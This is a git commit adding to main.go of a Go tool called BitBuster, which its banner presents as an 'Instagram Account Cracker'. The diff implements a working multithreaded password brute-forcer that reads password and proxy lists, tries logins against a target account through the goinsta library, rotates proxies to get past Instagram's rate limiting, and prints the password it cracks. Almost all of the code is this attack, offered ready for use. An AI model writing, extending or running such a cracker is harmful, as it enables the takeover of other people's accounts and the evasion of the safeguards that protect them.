f217dfdbfcc5f5ebb5d773f1b5fd9005ce273168
Peter Cunha <petercunha8@gmail.com>
2017-09-06 17:22:19 -0400

    Add file reading support. Add full multithreading and rate limit bypass (by way of proxies)

--- main.go
+++ main.go
@@ -4,18 +4,36 @@ import (
 	"fmt"
 	"strings"
 	"sync"
+	"os"
+	"bufio"
+	"time"
+	"net"
 
 	"github.com/ahmdrz/goinsta"
 )
 
-var wg sync.WaitGroup
+const username 	string = "USERNAME_TO_HACK"
+const WORKERS 	int = 25
+const VERBOSE 	bool = false
 
-var username string = "peterc.exe"
+var wg sync.WaitGroup
+var hasProxyWarningOccurred bool = false
 var passwords []string
+var proxies []string
 var cracked bool = false
+var active int = WORKERS
 
 func main() {
-  passwords = []string{"123", "456", "123", "456", "123", "456", "123", "456", "123", "456", "123", "456"}
+
+	// Print 'Welcome' banner
+	welcomeMessage()
+
+	// Load passwords and proxies into memory
+  passwords, _ = readLines("passwords.txt")
+	proxies, 	 _ = readLines("proxies.txt")
+
+	// Print 'Initialized' banner
+	initializedMessage()
 
   for len(passwords) > 0 && !cracked {
     // Begin the cracking process
@@ -23,58 +41,226 @@ func main() {
 
   	// Wait for all goroutines to complete
   	wg.Wait()
-
-    fmt.Println("COMPLETED CRACKING ROUND! PASSWORDS LEFT:", len(passwords))
   }
+
+	// Mission failed. We'll get em' next time!
+	failedMessage()
+}
+
+func welcomeMessage()  {
+	fmt.Println(`
+|------------------------------------------|
+|   BitBuster v1.0                         |
+|   Instagram Account Cracker              |
+|                                          |
+|   Written and maintained by Peter Cunha  |
+|   https://github.com/petercunha          |
+|------------------------------------------|
+		`)
+
+	fmt.Println("BitBuster is initializing...")
+}
+
+func initializedMessage() {
+	fmt.Println("\nTarget:", username)
+	fmt.Println("Passwords:", len(passwords))
+	fmt.Println("Proxies:", len(proxies))
+	fmt.Println("Threads:", WORKERS)
+
+	time.Sleep(time.Second * 1)
+	fmt.Print("\nCracking will begin in 3 seconds (Ctrl+C to exit)  ")
+	time.Sleep(time.Second * 1)
+	fmt.Print("3")
+	printDots()
+	time.Sleep(time.Second * 1)
+	fmt.Print("2")
+	printDots()
+	time.Sleep(time.Second * 1)
+	fmt.Print("1")
+	printDots()
+	time.Sleep(time.Second * 1)
+	fmt.Println("\nSpawning worker processes NOW!\n")
+	time.Sleep(time.Second * 1)
+}
+
+func failedMessage() {
+	fmt.Println("\n\nBitBuster was not able to crack the account. Sorry :(")
+}
+
+func printDots() {
+	time.Sleep(time.Millisecond * 50)
+	fmt.Print(".")
+	time.Sleep(time.Millisecond * 50)
+	fmt.Print(".")
+	time.Sleep(time.Millisecond * 50)
+	fmt.Print(". ")
 }
 
 func crack()  {
-  // Increment through username and password lists
-	for len(passwords) > 0 && !cracked {
+	// Don't start more threads than one thread per password
+	activatedWorkers := WORKERS
+	if WORKERS > len(passwords) {
+		activatedWorkers = len(passwords)
+	}
 
-		// Add a task to the WaitGroup
-		wg.Add(1)
+	// Start the worker processes
+	for i := 0; i < activatedWorkers; i++ {
+		go workerThread(i)
+	}
+	go statusLoop()
+}
 
-    // Pop a password off the slice
-		pass := passwords[len(passwords) - 1]
-    passwords = passwords[:len(passwords) - 1]
-
-		// Spawn a new thread to crack the account
-		func(p string) {
-
-			// Defer WaitGroup completion
-			defer wg.Done()
-
-			// Test login informaton
-			result := login(username, p)
-			if result == 0 {
-				fmt.Println(username + ":" + p, "worked!")
-			} else if result == 2 {
-				// Rate limit error. Push password back onto the stack.
-				passwords = append(passwords, p)
-			}
-		} (pass) // Pass login info to goroutine
+func statusLoop()  {
+	for true {
+		time.Sleep(time.Second * 10)
+		fmt.Println()
+		fmt.Println("<< STATUS UPDATE >>")
+		fmt.Println("Passwords remaining:", len(passwords))
+		fmt.Println("Proxies remaining:", len(proxies))
+		fmt.Println("Active workers:", active)
+		fmt.Println()
 	}
 }
 
-/*
-   Attempt to login to instagram account
-   Returns 1 for failure, 0 for success
-*/
-func login(user string, pass string) int {
-	insta := goinsta.New(user, pass)
+func workerThread(workerNumber int) {
+	// Add a task to the WaitGroup
+	wg.Add(1)
 
-	if err := insta.Login(); err != nil {
-		fmt.Println("Failed to login with", user+":"+pass)
-		fmt.Println("Error:\n", err)
-		if strings.Contains(err.Error(), "rate_limit_error") {
-			return 2
+	// Send worker finished signal on function exit
+	defer wg.Done()
+
+	// Pop a proxy off the slice
+	proxy := pop(&proxies)
+
+	// Worker startup message
+	if VERBOSE {
+		fmt.Println("Worker #", workerNumber, "started with proxy:", proxy)
+	}
+
+	// Begin cracking loop
+	for len(passwords) > 0 && !cracked {
+
+		// Pop a password off the slice
+		password := pop(&passwords)
+
+		// Test login informaton
+		result := login(username, password, "http://" + proxy, workerNumber)
+
+		if result == 0 {
+			/*
+			 *	Account cracked!
+			 */
+			fmt.Println("\n\nWorker #", workerNumber, "has cracked the account!")
+			fmt.Println("Username:", username + "\n" +
+									"Password:", password + "\n")
+			os.Exit(0)
+		} else if result == 2 {
+			/*
+			 *	Rate limit error occured!
+			 */
+
+			// Push last password back onto the stack.
+			passwords = append(passwords, password)
+
+			// Pull out a new proxy.
+			proxy = pop(&proxies)
+
+			// Loop until we get a valid proxy
+			for !checkConn(proxy) {
+				proxy = pop(&proxies)
+				if proxy == "" {
+					if VERBOSE {
+						fmt.Println("Worker #", workerNumber, "is terminating prematurely due to lack of proxies.")
+					}
+					break;
+				}
+			}
+
+			if proxy == "" {
+				if VERBOSE {
+					fmt.Println("Worker #", workerNumber, "is terminating prematurely due to lack of proxies.")
+				}
+				break;
+			}
+
+			// Worker proxy switch message
+			if VERBOSE {
+				fmt.Println("Worker #", workerNumber, "switching to new proxy:", proxy)
+			}
 		}
-		return 1
+	}
+	if VERBOSE {
+		fmt.Println("Worker #", workerNumber, "has finished.")
+	}
+	active--
+}
+
+/*
+ *   This function attempts to login to an instagram account
+ *
+ *	 Returns:
+ *	 	0 for success
+ *	 	1 for bad password
+ *		2 for rate-limit or connection error
+ */
+func login(user string, pass string, proxy string, workerNumber int) int {
+
+	//fmt.Println(user+":"+pass)
+
+	insta := goinsta.NewViaProxy(user, pass, proxy)
+	if err := insta.Login(); err != nil {
+		// fmt.Println(err)
+		if strings.Contains(err.Error(), `"error_type": "bad_password"`) {
+			return 1
+		}
+		return 2
 	}
 
 	defer insta.Logout()
 
   cracked = true
 	return 0
+}
+
+// Pops an element off a slice
+func pop(slice *[]string) string {
+	if len(*slice) == 0 {
+		if !hasProxyWarningOccurred {
+			fmt.Println("CRITICAL WARNING: Out of proxies!")
+		}
+		hasProxyWarningOccurred = true
+		return ""
+	}
+	val := (*slice)[len(*slice) - 1]
+	*slice = (*slice)[:len(*slice) - 1]
+	return val
+}
+
+// readLines() reads a whole file into memory
+// and returns a slice of its lines.
+func readLines(path string) ([]string, error) {
+  file, err := os.Open(path)
+  if err != nil {
+    return nil, err
+  }
+  defer file.Close()
+
+  var lines []string
+  scanner := bufio.NewScanner(file)
+  for scanner.Scan() {
+    lines = append(lines, scanner.Text())
+  }
+  return lines, scanner.Err()
+}
+
+// Checks if TCP conn. can be established to proxy
+func checkConn(proxy string) bool {
+  conn, err := net.Dial("tcp", proxy)
+
+  if err != nil {
+		return false
+  } else {
+		defer conn.Close()
+		return true
+  }
 }
